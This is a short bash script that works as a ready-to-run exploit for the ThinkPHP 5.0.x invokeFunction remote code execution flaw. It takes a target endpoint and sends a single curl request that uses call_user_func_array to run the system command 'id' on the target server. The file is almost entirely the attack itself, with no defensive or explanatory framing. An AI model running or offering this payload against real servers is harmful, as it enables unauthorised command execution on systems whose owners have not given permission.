#!/bin/bash
# ThinkPHP — invokeFunction RCE (5.0.x)
# Usage: invoke_function_rce.sh <ENDPOINT>
set -euo pipefail

ENDPOINT="${1:?Usage: $0 <ENDPOINT>}"

curl -s "${ENDPOINT}/index.php?s=/index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=id" \
  --max-time 10
